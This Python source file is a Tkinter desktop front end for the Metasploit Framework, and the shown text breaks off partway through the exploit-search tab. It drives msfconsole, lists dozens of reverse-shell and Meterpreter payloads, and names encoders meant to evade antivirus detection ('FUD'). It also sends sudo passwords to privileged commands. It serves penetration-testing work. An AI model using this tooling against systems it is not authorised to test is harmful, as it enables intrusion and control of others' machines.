#!/usr/bin/env python3
"""
YaP Metasploit GUI
Desktop application to automate and simplify using the Metasploit Framework.
"""

import sys
import os
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
import threading
import subprocess
import queue
import re
import json
from pathlib import Path
import shutil

# Try to import PIL for icon support
try:
    from PIL import Image, ImageTk
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# Try to import pystray for system tray support
try:
    import pystray
    HAS_PYSTRAY = True
except ImportError:
    HAS_PYSTRAY = False

# Comprehensive payload list
ALL_PAYLOADS = [
    # Windows Meterpreter
    "windows/meterpreter/reverse_tcp",
    "windows/meterpreter/reverse_http",
    "windows/meterpreter/reverse_https",
    "windows/meterpreter/reverse_dns",
    "windows/meterpreter/bind_tcp",
    "windows/meterpreter/reverse_tcp_rc4",
    "windows/meterpreter/reverse_tcp_allports",
    "windows/meterpreter/reverse_winhttp",
    "windows/meterpreter/reverse_winhttps",
    # Windows Shell
    "windows/shell/reverse_tcp",
    "windows/shell/reverse_http",
    "windows/shell/reverse_https",
    "windows/shell/bind_tcp",
    "windows/shell/reverse_tcp_rc4",
    # Linux Meterpreter
    "linux/x86/meterpreter/reverse_tcp",
    "linux/x86/meterpreter/reverse_http",
    "linux/x86/meterpreter/reverse_https",
    "linux/x86/meterpreter/bind_tcp",
    "linux/x64/meterpreter/reverse_tcp",
    "linux/x64/meterpreter/reverse_http",
    "linux/x64/meterpreter/reverse_https",
    "linux/x64/meterpreter/bind_tcp",
    # Linux Shell
    "linux/x86/shell/reverse_tcp",
    "linux/x86/shell/reverse_http",
    "linux/x86/shell/bind_tcp",
    "linux/x64/shell/reverse_tcp",
    "linux/x64/shell/reverse_http",
    "linux/x64/shell/bind_tcp",
    # Android
    "android/meterpreter/reverse_tcp",
    "android/meterpreter/reverse_http",
    "android/meterpreter/reverse_https",
    "android/shell/reverse_tcp",
    "android/shell/reverse_http",
    # macOS
    "osx/x86/shell_reverse_tcp",
    "osx/x86/meterpreter/reverse_tcp",
    "osx/x64/meterpreter/reverse_tcp",
    # PHP
    "php/meterpreter/reverse_tcp",
    "php/shell/reverse_tcp",
    "php/bind_php",
    # Python
    "python/meterpreter/reverse_tcp",
    "python/shell/reverse_tcp",
    "python/shell_bind_tcp",
    # Java
    "java/meterpreter/reverse_tcp",
    "java/shell/reverse_tcp",
    "java/shell/bind_tcp",
    # PowerShell
    "windows/powershell/meterpreter/reverse_tcp",
    "windows/powershell/meterpreter/reverse_http",
    "windows/powershell/meterpreter/reverse_https",
    "windows/powershell/shell/reverse_tcp",
    # CMD
    "cmd/windows/powershell/meterpreter/reverse_tcp",
    "cmd/windows/powershell/shell/reverse_tcp",
    # NodeJS
    "nodejs/shell_reverse_tcp",
    "nodejs/shell_bind_tcp",
    # Ruby
    "ruby/shell_reverse_tcp",
    "ruby/shell_bind_tcp",
    # Perl
    "perl/shell_reverse_tcp",
    "perl/shell_bind_tcp",
    # Bash
    "bash/shell/reverse_tcp",
    "bash/shell/bind_tcp",
]

# Common encoders for FUD
ENCODERS = [
    "x86/shikata_ga_nai",
    "x86/fnstenv_mov",
    "x86/call4_dword_xor",
    "x86/jmp_call_additive",
    "x86/nonalpha",
    "x86/alpha_upper",
    "x86/unicode_mixed",
    "x86/unicode_upper",
    "cmd/powershell_base64",
    "generic/none",
]

# Common formats
FORMATS = [
    "raw", "exe", "elf", "dll", "so", "bin", "ps1", "vbs", "js", "py", "rb", "pl",
    "sh", "bat", "cmd", "war", "jar", "apk", "deb", "rpm", "msi", "asp", "aspx",
    "jsp", "php", "python", "ruby", "perl", "bash", "c", "csharp", "java",
    "hex", "base64", "csharp", "vbapplication", "vbs", "vba", "vbe", "psh",
    "psh-cmd", "psh-net", "psh-reflection", "hta", "js_be", "js_le", "dll",
    "macho", "osx-app", "msi-nouac", "vbs", "loop-vbs", "exe-small", "exe-only",
    "exe-service", "exe-subservice", "reflective-dll", "reflective-dll-exe",
]

class MetasploitConsole:
    """Manages Metasploit console subprocess."""
    
    def __init__(self, output_callback=None):
        self.process = None
        self.output_callback = output_callback
        self.running = False
        self.output_queue = queue.Queue()
        self.read_thread = None
        
    def start(self, window_x=None, window_y=None, preferred_monitor='primary'):
        """Start Metasploit console.
        
        Args:
            window_x: X position of main window (for positioning password dialog)
            window_y: Y position of main window (for positioning password dialog)
            preferred_monitor: Preferred monitor for password dialog ('primary' or monitor index)
        """
        if self.running:
            return False
        
        try:
            msfconsole_path = self._find_msfconsole()
            if not msfconsole_path:
                raise FileNotFoundError("msfconsole not found. Please install Metasploit Framework.")
            
            # Set environment variables to suppress stty errors
            env = os.environ.copy()
            env['TERM'] = 'dumb'  # Prevent terminal control sequences
            env['COLUMNS'] = '80'
            env['LINES'] = '24'
            
            # Set up SUDO_ASKPASS for password prompts
            # This allows sudo to use a GUI password dialog when needed
            askpass_path = self._find_askpass_helper()
            if askpass_path:
                # Make sure the script is executable
                try:
                    os.chmod(askpass_path, 0o755)
                except:
                    pass
                
                env['SUDO_ASKPASS'] = askpass_path
                # Ensure DISPLAY is available for the askpass GUI
                if 'DISPLAY' not in env:
                    env['DISPLAY'] = os.environ.get('DISPLAY', ':0')
                if 'DISPLAY' not in os.environ:
                    os.environ['DISPLAY'] = env['DISPLAY']
                
                # Also set SUDO_ASKPASS in global environment so child processes inherit it
                os.environ['SUDO_ASKPASS'] = askpass_path
                
                # Pass preferred monitor to askpass script via environment
                env['YAP_PREFERRED_MONITOR'] = preferred_monitor
                os.environ['YAP_PREFERRED_MONITOR'] = preferred_monitor
                
                # Pass window position to askpass script via environment (for fallback)
                if window_x is not None and window_y is not None:
                    env['YAP_GUI_X'] = str(window_x)
                    env['YAP_GUI_Y'] = str(window_y)
                    os.environ['YAP_GUI_X'] = str(window_x)
                    os.environ['YAP_GUI_Y'] = str(window_y)
            
            # Also ensure SUDO_ASKPASS is in environment even if not found (for debugging)
            if 'SUDO_ASKPASS' not in env:
                # Try to set it from global environment
                if 'SUDO_ASKPASS' in os.environ:
                    env['SUDO_ASKPASS'] = os.environ['SUDO_ASKPASS']
            
            self.process = subprocess.Popen(
                [msfconsole_path, '-q'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1,
                env=env
            )
            
            self.running = True
            
            self.read_thread = threading.Thread(target=self._read_output, daemon=True)
            self.read_thread.start()
            
            return True
        except Exception as e:
            if self.output_callback:
                self.output_callback(f"Error starting Metasploit: {str(e)}\n", "error")
            return False
    
    def _find_msfconsole(self):
        """Find msfconsole executable on the system."""
        # First, try to find it in PATH (most common case)
        msfconsole_path = shutil.which('msfconsole')
        if msfconsole_path:
            return msfconsole_path
        
        # If not in PATH, check common installation locations
        common_paths = [
            '/usr/bin/msfconsole',
            '/opt/metasploit-framework/msfconsole',
            '/usr/local/bin/msfconsole',
            '/usr/share/metasploit-framework/msfconsole',
            os.path.expanduser('~/metasploit-framework/msfconsole'),
            os.path.expanduser('~/.msf4/msfconsole'),
        ]
        
        for path in common_paths:
            if os.path.exists(path) and os.access(path, os.X_OK):
                return path
        
        # Check if Metasploit might be installed via package manager but not in PATH
        # Try to find it via which with full path search
        for base_path in ['/opt', '/usr', '/usr/local', os.path.expanduser('~')]:
            for root, dirs, files in os.walk(base_path):
                if 'msfconsole' in files:
                    full_path = os.path.join(root, 'msfconsole')
                    if os.access(full_path, os.X_OK):
                        return full_path
                # Don't search too deep
                if root.count(os.sep) - base_path.count(os.sep) > 3:
                    dirs[:] = []  # Don't recurse deeper
        
        return None
    
    def _find_askpass_helper(self):
        """Find the sudo askpass helper script."""
        # Get the directory where this script is located
        if getattr(sys, 'frozen', False):
            # PyInstaller/AppImage context
            if hasattr(sys, '_MEIPASS'):
                # PyInstaller bundle
                base_path = sys._MEIPASS
            else:
                # Standalone executable
                base_path = os.path.dirname(sys.executable)
        else:
            # Development context
            base_path = os.path.dirname(__file__)
        
        # Look for askpass script
        askpass_paths = [
            os.path.join(base_path, 'sudo_askpass.py'),
            os.path.join(os.path.dirname(base_path), 'core', 'sudo_askpass.py'),
            os.path.join(base_path, 'core', 'sudo_askpass.py'),
        ]
        
        for path in askpass_paths:
            if os.path.exists(path) and os.access(path, os.R_OK):
                # Make sure it's executable
                if not os.access(path, os.X_OK):
                    try:
                        os.chmod(path, 0o755)
                    except:
                        pass
                # Return absolute path to ensure it's accessible
                return os.path.abspath(path)
        
        return None
    
    def _read_output(self):
        """Read output from Metasploit console."""
        try:
            while self.running and self.process:
                line = self.process.stdout.readline()
                if not line:
                    break
                
                # Filter out stty errors and other noise
                stripped = line.strip()
                
                # Skip stty error messages
                if 'stty:' in stripped.lower() and 'inappropriate ioctl' in stripped.lower():
                    continue
                
                # Skip ANSI escape sequences (like [?1034h)
                if stripped.startswith('\x1b[') or (stripped.startswith('[?') and 'h' in stripped):
                    continue
                
                # Skip empty lines and startup messages
                if not stripped or stripped.startswith('[*] Starting'):
                    continue
                
                if self.output_callback:
                    self.output_callback(line, "output")
        except Exception as e:
            if self.output_callback:
                self.output_callback(f"Error reading output: {str(e)}\n", "error")
        finally:
            self.running = False
    
    def send_command(self, command):
        """Send command to Metasploit console."""
        if not self.running or not self.process:
            return False
        
        try:
            self.process.stdin.write(command + '\n')
            self.process.stdin.flush()
            return True
        except Exception as e:
            if self.output_callback:
                self.output_callback(f"Error sending command: {str(e)}\n", "error")
            return False
    
    def stop(self):
        """Stop Metasploit console."""
        if not self.running:
            return
        
        self.running = False
        
        if self.process:
            try:
                self.process.stdin.write('exit\n')
                self.process.stdin.flush()
                self.process.stdin.close()
            except:
                pass
            
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except:
                try:
                    self.process.kill()
                except:
                    pass
        
        if self.read_thread:
            self.read_thread.join(timeout=1)

class MetasploitGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("YaP Metasploit GUI")
        # Optimized window size for better fit - larger to accommodate all content
        self.root.geometry("1600x950")
        self.root.resizable(True, True)
        self.root.minsize(1400, 800)  # Minimum size for better fit
        
        self.console = None
        self.tray_icon = None
        self.tray_thread = None
        self.hidden_to_tray = False
        self.payload_save_path = os.path.expanduser("~")
        
        # Search state tracking
        self.active_search = None  # 'exploit', 'auxiliary', 'module', or None
        self.search_output_buffer = []  # Buffer to collect search output
        self.search_parsing = False  # Flag to indicate we're parsing search results
        self.is_show_command = False  # Flag to track if this is a "show" command (different format)
        self.search_timeout_id = None  # Timeout ID for processing search results
        
        # Command history and logs
        self.command_history = []
        self.command_history_index = -1
        self.activity_logs = []
        
        # Database state
        self.current_workspace = "default"
        self.hosts_data = []
        self.services_data = []
        self.vulnerabilities_data = []
        self.loot_data = []
        self.database_connected = False
        self.database_initializing = False
        self._auto_init_attempted = False
        
        # Resource scripts
        self.resource_scripts = []
        self.current_script_path = None
        
        # Credentials
        self.credentials_data = []
        
        # Scan state
        self.scanning = False
        self.current_scan_target = None
        self.scan_output_buffer = []
        
        # Settings
        self.settings = {
            'theme': 'default',
            'font_size': 10,
            'auto_save_history': True,
            'default_payload': 'windows/meterpreter/reverse_tcp',
            'default_lhost': '0.0.0.0',
            'default_lport': '4444',
            'auto_init_db': True,  # Auto-initialize database when not connected
            'preferred_monitor': 'primary',  # 'primary', 'monitor_0', 'monitor_1', etc., or monitor name
        }
        
        # Multi-session runner
        self.multi_session_selected = []
        
        # Workflow automation
        self.workflows = []
        self.current_workflow = None
        
        # Session groups
        self.session_groups = {}
        self.group_counter = 1
        
        # Session list data for multi-session and session groups
        self.session_list_data = []
        
        # Load settings from file if exists
        self._load_settings()
        
        # Set up SUDO_ASKPASS environment variable early so it's available globally
        # This ensures that when Metasploit spawns child processes (like nmap), they inherit it
        self._setup_sudo_askpass()
        
        self.create_widgets()
        self._set_window_icon()
        
        if HAS_PYSTRAY:
            self.setup_system_tray()
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.center_window()
    
    def _find_icon_path(self):
        """Find icon/logo path."""
        if getattr(sys, 'frozen', False):
            # PyInstaller/AppImage context
            if hasattr(sys, '_MEIPASS'):
                # PyInstaller bundle
                base_paths = [
                    sys._MEIPASS,
                    os.path.dirname(sys.executable),
                    os.path.join(os.path.dirname(sys.executable), ".."),
                ]
            else:
                # Standalone executable
                base_paths = [
                    os.path.dirname(sys.executable),
                    os.path.join(os.path.dirname(sys.executable), ".."),
                ]
            
            # For AppImage, also check the AppDir structure
            exe_dir = os.path.dirname(sys.executable)
            if "_internal" in exe_dir or "usr/bin" in exe_dir:
                # AppImage structure: check AppDir root
                appdir_root = exe_dir
                while "_internal" in appdir_root or "usr/bin" in appdir_root:
                    appdir_root = os.path.dirname(appdir_root)
                base_paths.insert(0, appdir_root)
        else:
            # Development context
            base_paths = [
                os.path.dirname(os.path.dirname(__file__)),
                os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                os.path.join(os.path.dirname(os.path.dirname(__file__)), ".."),
            ]
        
        icon_paths = []
        for base in base_paths:
            icon_paths.extend([
                os.path.join(base, "yapmetasploitgui250.png"),
                os.path.join(base, "icon.png"),
                os.path.join(base, "yaplab.png"),
                os.path.join(base, "yap-metasploit-gui.png"),
                # Check in common subdirectories
                os.path.join(base, "icons", "yapmetasploitgui250.png"),
                os.path.join(base, "icons", "icon.png"),
            ])
        
        for path in icon_paths:
            if os.path.exists(path):
                return path
        
        return None
    
    def _load_logo(self):
        """Load and display logo in the title frame."""
        def _load():
            try:
                icon_path = self._find_icon_path()
                if icon_path and HAS_PIL:
                    img = Image.open(icon_path)
                    # Resize to a more prominent size for display (96x96 for better visibility)
                    img = img.resize((96, 96), Image.Resampling.LANCZOS)
                    self.logo_photo = ImageTk.PhotoImage(img)
                    
                    def _display():
                        if hasattr(self, 'logo_photo') and hasattr(self, 'logo_label'):
                            # Update the existing logo label with the image
                            self.logo_label.config(image=self.logo_photo)
                            # Center the logo
                            self.logo_label.config(anchor='center')
                    self.root.after(0, _display)
                elif icon_path:
                    # If PIL is not available, try to use a simple text label
                    self.root.after(0, lambda: self.logo_label.config(text="[Logo]", font=("Segoe UI", 12)))
            except Exception as e:
                # Silently fail if logo can't be loaded
                pass
        
        threading.Thread(target=_load, daemon=True).start()
    
    def _set_window_icon(self):
        """Set the window icon for taskbar."""
        def _load_icon():
            try:
                icon_path = self._find_icon_path()
                
                if icon_path and HAS_PIL:
                    try:
                        img = Image.open(icon_path)
                        # For window icon, use a smaller size (32x32 or 48x48)
                        img = img.resize((48, 48), Image.Resampling.LANCZOS)
                        self.icon_img = ImageTk.PhotoImage(img)
                        self.root.iconphoto(True, self.icon_img)
                    except:
                        pass
            except Exception:
                pass
        
        threading.Thread(target=_load_icon, daemon=True).start()
    
    def _setup_sudo_askpass(self):
        """Set up SUDO_ASKPASS environment variable globally in MetasploitGUI."""
        # Find the askpass helper script (using same logic as MetasploitConsole)
        if getattr(sys, 'frozen', False):
            if hasattr(sys, '_MEIPASS'):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(sys.executable)
        else:
            base_path = os.path.dirname(__file__)
        
        askpass_paths = [
            os.path.join(base_path, 'sudo_askpass.py'),
            os.path.join(os.path.dirname(base_path), 'core', 'sudo_askpass.py'),
            os.path.join(base_path, 'core', 'sudo_askpass.py'),
        ]
        
        askpass_path = None
        for path in askpass_paths:
            if os.path.exists(path) and os.access(path, os.R_OK):
                # Make sure it's executable
                if not os.access(path, os.X_OK):
                    try:
                        os.chmod(path, 0o755)
                    except:
                        pass
                askpass_path = os.path.abspath(path)
                break
        
        if askpass_path:
            # Set it in the global environment so all child processes inherit it
            os.environ['SUDO_ASKPASS'] = askpass_path
            
            # Also set SUDO_ASKPASS_PROMPT to ensure it's used
            # Some systems require this to be set
            os.environ['SUDO_ASKPASS_PROMPT'] = 'Password:'
            
            # Ensure DISPLAY is set for the GUI dialog
            if 'DISPLAY' not in os.environ:
                display = os.environ.get('DISPLAY', ':0')
                os.environ['DISPLAY'] = display
            
            # Set preferred monitor
            preferred_monitor = self.settings.get('preferred_monitor', 'primary')
            os.environ['YAP_PREFERRED_MONITOR'] = preferred_monitor
            
            # Debug: Log that we set up askpass
            try:
                debug_log = os.path.expanduser("~/.yap_metasploit_debug.log")
                with open(debug_log, 'a') as f:
                    import datetime
                    f.write(f"{datetime.datetime.now()}: SUDO_ASKPASS set to: {askpass_path}\n")
                    f.write(f"DISPLAY: {os.environ.get('DISPLAY', 'NOT SET')}\n")
            except:
                pass
    
    def _load_settings(self):
        """Load settings from file."""
        settings_file = os.path.join(os.path.expanduser("~"), ".yap_metasploit_gui_settings.json")
        if os.path.exists(settings_file):
            try:
                with open(settings_file, 'r') as f:
                    loaded_settings = json.load(f)
                    self.settings.update(loaded_settings)
            except:
                pass
    
    def _save_settings(self):
        """Save settings to file."""
        settings_file = os.path.join(os.path.expanduser("~"), ".yap_metasploit_gui_settings.json")
        try:
            with open(settings_file, 'w') as f:
                json.dump(self.settings, f, indent=2)
        except:
            pass
    
    def get_monitors(self):
        """Get list of all available monitors.
        
        Returns:
            List of dicts with monitor info: [{'name': str, 'width': int, 'height': int, 
            'x': int, 'y': int, 'primary': bool, 'connected': bool}]
        """
        monitors = []
        try:
            result = subprocess.run(['xrandr', '--query'], 
                                  capture_output=True, 
                                  text=True, 
                                  timeout=2)
            if result.returncode == 0:
                current_monitor = None
                for line in result.stdout.split('\n'):
                    # Check for connected monitor line: "DP-1 connected primary 1920x1080+0+0"
                    if ' connected ' in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            name = parts[0]
                            connected = 'connected' in line.lower()
                            is_primary = 'primary' in line.lower()
                            
                            # Extract geometry: width x height + x + y
                            geom_match = re.search(r'(\d+)x(\d+)\+(\d+)\+(\d+)', line)
                            if geom_match:
                                width = int(geom_match.group(1))
                                height = int(geom_match.group(2))
                                x = int(geom_match.group(3))
                                y = int(geom_match.group(4))
                                
                                monitors.append({
                                    'name': name,
                                    'width': width,
                                    'height': height,
                                    'x': x,
                                    'y': y,
                                    'primary': is_primary,
                                    'connected': connected
                                })
        except (FileNotFoundError, subprocess.TimeoutExpired, subprocess.SubprocessError):
            pass
        
        # If no monitors found via xrandr, fall back to tkinter screen info
        if not monitors:
            try:
                screen_width = self.root.winfo_screenwidth()
                screen_height = self.root.winfo_screenheight()
                monitors.append({
                    'name': 'default',
                    'width': screen_width,
                    'height': screen_height,
                    'x': 0,
                    'y': 0,
                    'primary': True,
                    'connected': True
                })
            except:
                pass
        
        return monitors
    
    def get_preferred_monitor(self):
        """Get the preferred monitor based on settings.
        
        Returns:
            Dict with monitor info, or None if not found
        """
        monitors = self.get_monitors()
        if not monitors:
            return None
        
        preferred = self.settings.get('preferred_monitor', 'primary')
        
        # If 'primary', find the primary monitor
        if preferred == 'primary':
            for monitor in monitors:
                if monitor.get('primary', False):
                    return monitor
            # If no primary found, return first monitor
            return monitors[0] if monitors else None
        
        # Try to find by name
        for monitor in monitors:
            if monitor['name'] == preferred:
                return monitor
        
        # Try to find by index (monitor_0, monitor_1, etc.)
        if preferred.startswith('monitor_'):
            try:
                index = int(preferred.split('_')[1])
                if 0 <= index < len(monitors):
                    return monitors[index]
            except (ValueError, IndexError):
                pass
        
        # Fallback to primary or first monitor
        for monitor in monitors:
            if monitor.get('primary', False):
                return monitor
        return monitors[0] if monitors else None
    
    def center_window(self, monitor_name=None):
        """Center the window on the specified monitor or preferred monitor.
        
        Args:
            monitor_name: Optional monitor name to center on. If None, uses preferred monitor from settings.
        """
        def _center():
            self.root.update_idletasks()
            window_width = self.root.winfo_width()
            window_height = self.root.winfo_height()
            
            # Get the monitor to use
            monitor = None
            if monitor_name:
                monitors = self.get_monitors()
                for m in monitors:
                    if m['name'] == monitor_name:
                        monitor = m
                        break
            
            if not monitor:
                monitor = self.get_preferred_monitor()
            
            if monitor:
                x = monitor['x'] + (monitor['width'] // 2) - (window_width // 2)
                y = monitor['y'] + (monitor['height'] // 2) - (window_height // 2)
                self.root.geometry(f"+{x}+{y}")
            else:
                # Fallback to default centering
                screen_width = self.root.winfo_screenwidth()
                screen_height = self.root.winfo_screenheight()
                x = (screen_width // 2) - (window_width // 2)
                y = (screen_height // 2) - (window_height // 2)
                self.root.geometry(f"+{x}+{y}")
        
        self.root.after_idle(_center)
    
    def _ask_sudo_password(self, prompt="Administrator password required"):
        """Show a password dialog and return the password."""
        password = simpledialog.askstring(
            "Password Required",
            f"{prompt}\n\nEnter your password:",
            show='*'
        )
        return password
    
    def _run_with_sudo(self, cmd, **kwargs):
        """
        Run a command with sudo, prompting for password if needed.
        Returns the subprocess.CompletedProcess result.
        """
        # First, try to run the command without sudo
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                **{k: v for k, v in kwargs.items() if k != 'sudo'}
            )
            
            # Check if we got a permission denied error
            if result.returncode != 0:
                error_output = (result.stderr or result.stdout or "").lower()
                if any(keyword in error_output for keyword in [
                    'permission denied', 'operation not permitted', 
                    'access denied', 'cannot open', 'eacces', 'eperm'
                ]):
                    # Permission denied - try with sudo
                    password = self._ask_sudo_password(
                        f"Administrator privileges required to run: {' '.join(cmd)}"
                    )
                    
                    if password is None:
                        # User cancelled
                        return subprocess.CompletedProcess(
                            cmd, 1, "", "Operation cancelled by user"
                        )
                    
                    # Run with sudo -S (read password from stdin)
                    sudo_cmd = ['sudo', '-S'] + cmd
                    try:
                        result = subprocess.run(
                            sudo_cmd,
                            input=password + '\n',
                            capture_output=True,
                            text=True,
                            **{k: v for k, v in kwargs.items() if k != 'sudo'}
                        )
                    except subprocess.TimeoutExpired:
                        raise
                    except Exception as e:
                        # If sudo fails, it might be because password was wrong
                        # Try again with a fresh password prompt
                        password = self._ask_sudo_password(
                            f"Password incorrect or sudo failed.\n\nRetry password for: {' '.join(cmd)}"
                        )
                        if password is None:
                            return subprocess.CompletedProcess(
                                cmd, 1, "", "Operation cancelled by user"
                            )
                        sudo_cmd = ['sudo', '-S'] + cmd
                        result = subprocess.run(
                            sudo_cmd,
                            input=password + '\n',
                            capture_output=True,
                            text=True,
                            **{k: v for k, v in kwargs.items() if k != 'sudo'}
                        )
            
            return result
        except subprocess.TimeoutExpired as e:
            raise
        except Exception as e:
            # If there's an exception, try with sudo
            password = self._ask_sudo_password(
                f"Administrator privileges may be required to run: {' '.join(cmd)}"
            )
            
            if password is None:
                return subprocess.CompletedProcess(
                    cmd, 1, "", f"Operation cancelled: {str(e)}"
                )
            
            sudo_cmd = ['sudo', '-S'] + cmd
            try:
                result = subprocess.run(
                    sudo_cmd,
                    input=password + '\n',
                    capture_output=True,
                    text=True,
                    **{k: v for k, v in kwargs.items() if k != 'sudo'}
                )
                return result
            except Exception as e2:
                return subprocess.CompletedProcess(
                    cmd, 1, "", f"Error running command: {str(e2)}"
                )
    
    def create_widgets(self):
        """Create GUI widgets."""
        style = ttk.Style()
        style.theme_use('clam')
        
        main_frame = ttk.Frame(self.root, padding="2")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        title_frame = ttk.Frame(main_frame)
        title_frame.pack(pady=(1, 1))
        
        # Create logo label first (empty initially) so it's packed before title
        self.logo_label = ttk.Label(title_frame)
        self.logo_label.pack(pady=(0, 4))
        
        # Load and display logo image (will update the label when ready)
        self._load_logo()
        
        # Pack title and subtitle after logo
        title_label = ttk.Label(
            title_frame,
            text="YaP Metasploit GUI",
            font=("Segoe UI", 16, "bold")
        )
        title_label.pack()
        
        subtitle_label = ttk.Label(
            title_frame,
            text="Automated Metasploit Framework Interface",
            font=("Segoe UI", 9),
            foreground="#666666"
        )
        subtitle_label.pack(pady=(2, 0))
        
        # Create custom grid-based tab system
        self.tab_container = ttk.Frame(main_frame)
        self.tab_container.pack(fill=tk.BOTH, expand=True, pady=(2, 0))
        
        # Tab bar frame (will contain buttons in grid)
        self.tab_bar_frame = ttk.Frame(self.tab_container)
        self.tab_bar_frame.pack(fill=tk.X, pady=(0, 2))
        
        # Content frame (will show selected tab content)
        self.tab_content_frame = ttk.Frame(self.tab_container)
        self.tab_content_frame.pack(fill=tk.BOTH, expand=True)
        
        # Store tab frames and buttons
        self.tab_frames = {}
        self.tab_buttons = {}
        self.current_tab = None
        self.tab_order = []  # Track tab order for grid layout
        
        # Make notebook be the content frame (so frames created with self.notebook as parent work)
        # Add methods to it for notebook-like interface
        self.notebook = self.tab_content_frame
        self.notebook.add = lambda frame, text: self.add_tab_to_grid(frame, text)
        self.notebook.index = lambda tab: self.index(tab)
        self.notebook.tab = lambda index, option=None: self.tab(index, option)
        self.notebook.select = lambda tab_index: self.select(tab_index)
        
        # Core tabs
        self.create_quick_start_wizard_tab()  # Beginner-friendly first
        self.create_console_tab()
        self.create_exploit_search_tab()
        self.create_exploit_builder_tab()
        self.create_payload_generator_tab()
        self.create_auxiliary_tab()
        self.create_handler_tab()
        self.create_vulnerability_scanner_tab()
        self.create_session_manager_tab()
        self.create_meterpreter_tab()
        self.create_post_exploitation_tab()
        self.create_database_manager_tab()
        self.create_credential_manager_tab()
        self.create_resource_scripts_tab()
        self.create_network_mapper_tab()
        self.create_logs_history_tab()
        self.create_report_generator_tab()
        self.create_multi_session_runner_tab()
        self.create_workflow_automation_tab()
        self.create_session_groups_tab()
        self.create_quick_actions_hub_tab()
        self.create_settings_tab()
        self.create_commands_tab()
        
        footer_label = ttk.Label(
            main_frame,
            text="© YaP Labs",
            font=("Segoe UI", 7),
            foreground="#999999"
        )
        footer_label.pack(side=tk.BOTTOM, pady=(2, 0))
    
    def create_console_tab(self):
        """Create the integrated Metasploit console tab."""
        console_frame = ttk.Frame(self.notebook, padding="2")
        self.notebook.add(console_frame, text="Metasploit Console")
        
        control_frame = ttk.Frame(console_frame)
        control_frame.pack(fill=tk.X, pady=(0, 3))
        
        self.start_btn = ttk.Button(
            control_frame,
            text="Start Console",
            command=self.start_console
        )
        self.start_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        self.stop_btn = ttk.Button(
            control_frame,
            text="Stop Console",
            command=self.stop_console,
            state="disabled"
        )
        self.stop_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        clear_btn = ttk.Button(
            control_frame,
            text="Clear",
            command=self.clear_console
        )
        clear_btn.pack(side=tk.LEFT, padx=(0, 10))
        
        # Database status and controls
        db_separator = ttk.Separator(control_frame, orient=tk.VERTICAL)
        db_separator.pack(side=tk.LEFT, fill=tk.Y, padx=5)
        
        self.db_status_label = ttk.Label(
            control_frame,
            text="Database: Unknown",
            foreground="gray"
        )
        self.db_status_label.pack(side=tk.LEFT, padx=(5, 5))
        
        db_init_btn = ttk.Button(
            control_frame,
            text="Initialize Database",
            command=self.initialize_database
        )
        db_init_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        db_check_btn = ttk.Button(
            control_frame,
            text="Check Status",
            command=self.check_database_status
        )
        db_check_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        db_setup_btn = ttk.Button(
            control_frame,
            text="Run msfdb init",
            command=self.run_msfdb_init_gui
        )
        db_setup_btn.pack(side=tk.LEFT)
        
        output_frame = ttk.LabelFrame(console_frame, text="Console Output", padding="2")
        output_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 3))
        
        self.console_output = scrolledtext.ScrolledText(
            output_frame,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="#1e1e1e",
            fg="#d4d4d4",
            insertbackground="#d4d4d4"
        )
        self.console_output.pack(fill=tk.BOTH, expand=True)
        
        self.console_output.tag_config("output", foreground="#d4d4d4")
        self.console_output.tag_config("error", foreground="#f48771")
        self.console_output.tag_config("success", foreground="#4ec9b0")
        self.console_output.tag_config("warning", foreground="#dcdcaa")
        
        input_frame = ttk.LabelFrame(console_frame, text="Command Input", padding="2")
        input_frame.pack(fill=tk.X)
        
        input_container = ttk.Frame(input_frame)
        input_container.pack(fill=tk.X)
        
        self.command_entry = ttk.Entry(
            input_container,
            font=("Consolas", 10)
        )
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.command_entry.bind('<Return>', self.send_console_command)
        self.command_entry.bind('<Up>', self.command_history_up)
        self.command_entry.bind('<Down>', self.command_history_down)
        
        send_btn = ttk.Button(
            input_container,
            text="Send",
            command=self.send_console_command
        )
        send_btn.pack(side=tk.RIGHT)
        
        quick_frame = ttk.LabelFrame(console_frame, text="Quick Commands", padding="2")
        quick_frame.pack(fill=tk.X, pady=(3, 0))
        
        quick_commands = [
            ("help", "help"),
            ("version", "version"),
            ("show exploits", "show exploits"),
            ("show payloads", "show payloads"),
            ("show auxiliaries", "show auxiliaries")
        ]
        
        # Arrange buttons in 5 columns (single row) for better horizontal fit
        cols = 5
        for i, (label, cmd) in enumerate(quick_commands):
            btn = ttk.Button(
                quick_frame,
                text=label,
                command=lambda c=cmd: self.quick_command(c),
                width=12  # Reduced width to fit more buttons
            )
            btn.grid(row=i // cols, column=i % cols, padx=1, pady=1, sticky=(tk.W, tk.E))
        
        # Configure all columns to expand evenly
        for col in range(cols):
            quick_frame.columnconfigure(col, weight=1)
    
    def create_exploit_search_tab(self):
        """Create exploit search tab."""
        search_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(search_frame, text="Exploit Search")
        
        search_input_frame = ttk.Frame(search_frame)
        search_input_frame.pack(fill=tk.X, pady=(0, 4))
        
        ttk.Label(search_input_frame, text="Search:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.exploit_search_entry = ttk.Entry(search_input_frame)
        self.exploit_search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.exploit_search_entry.bind('<Return>', lambda e: self.search_exploits())
        
        search_btn = ttk.Button(
            search_input_frame,
            text="Search",
            command=self.search_exploits
        )
        search_btn.pack(side=tk.RIGHT, padx=(5, 0))
        
